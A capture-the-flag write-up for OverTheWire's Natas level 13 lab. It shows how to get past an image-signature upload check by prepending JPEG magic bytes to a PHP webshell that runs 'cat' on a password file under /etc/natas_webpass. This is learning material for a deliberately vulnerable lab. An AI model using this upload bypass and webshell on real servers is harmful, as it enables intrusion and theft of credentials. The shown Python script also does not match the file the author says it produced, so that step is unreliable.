# NATAS13

## Step 1: View the source code
The only difference between this level and natas12 is the line where the file is checked for an image signature.  If you click "View Source Code" at http://natas13.natas.labs.overthewire.org/index-source.html, you'll see this function:

```javascript

    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    }
```
The documentation for exif_imagetype() is available at php.net:
http://php.net/manual/en/function.exif-imagetype.php

Reading through the documentation, we see that it "reads the first bytes of an image and checks its signature."  Thus, we need to find a way to fake an image signature.

An astute observer might also note that the server script isn't checking for file extensions.  A php script just like the one used for natas12 will be interpreted by the webserver because of it's file extension and ignore anything else like the signature of an image until it reaches the opening '<?php' that indicates a script to follow.

## Step 2: Fake an image file signature
There are plenty of websites on the internet that provide file signatures for various image formats.  A cursory search engine query will turn up something you can use.  The initial mistake I made was thinking I could open up a file and write hex values by hand.  This was my payload:
```php
FFD8FFE0
<?php
$password = shell_exec("cat /etc/natas_webpass/natas13");
echo "<pre>$output</pre>";
?>
```

I tried to prepend a jpeg signature to my php script and found that it still didn't fool the exif_imagetype() function.  So I grabbed a jpeg file from my laptop and did a hexdump:

```bash
~# hexdump image.jpeg
0000000 ff d8 ff e0 00 10 4a 46 49 46 00 01 01 00 00 01
```
Then I tried the same thing on my malfunctioning payload:
```
~# hexdump test.php
0000000 46 46 44 38 46 46 45 30 0a 3c 3f 70 68 70 0a 24
0000010 70 61 73 73 77 6f 72 64 20 3d 20 73 68 65 6c 6c
0000020 5f 65 78 65 63 28 22 63 61 74 20 2f 65 74 63 2f
0000030 6e 61 74 61 73 5f 77 65 62 70 61 73 73 2f 6e 61
0000040 74 61 73 31 33 22 29 3b 0a 65 63 68 6f 20 22 3c
0000050 70 72 65 3e 24 6f 75 74 70 75 74 3c 2f 70 72 65
0000060 3e 22 3b 0a 3f 3e 0a
0000067
```
Okay, so I can't write that by hand.  A little online research suggested writing some code to do it for me:
```python
#!/bin/python
fp = open("test.php",'w')
fp.write('\xFF\xD8\xFF\xE0' + 'shell_exec("cat /etc/natas_webpass/natas14");')
fp.close()
```
So then I opened up my file with an editor:
```php
ÿØÿà<?php print shell_exec("cat /etc/natas_webpass/natas14"); ?>
```
Those weird characters before my php script are the binary hex values that we were looking for.
Just to confirm, I took a look at the file in hexdump again:
```bash
~# hexdump test.php
0000000 ff d8 ff e0 3c 3f 70 68 70 20 70 72 69 6e 74 20
0000010 73 68 65 6c 6c 5f 65 78 65 63 28 22 63 61 74 20
0000020 2f 65 74 63 2f 6e 61 74 61 73 5f 77 65 62 70 61
0000030 73 73 2f 6e 61 74 61 73 31 34 22 29 3b 20 3f 3e
0000040 0a
0000041
```
It worked.  Now lets see if we can fool the server.

## Step 3: Upload your payload

Just upload the working file you just created, and sure enough, we got past the filter.  Natas13 gave us a link to our new file.  Follow the link, copy the password - making sure to not copy the first 4 values (those are the binary hex values used to fake the image signature).
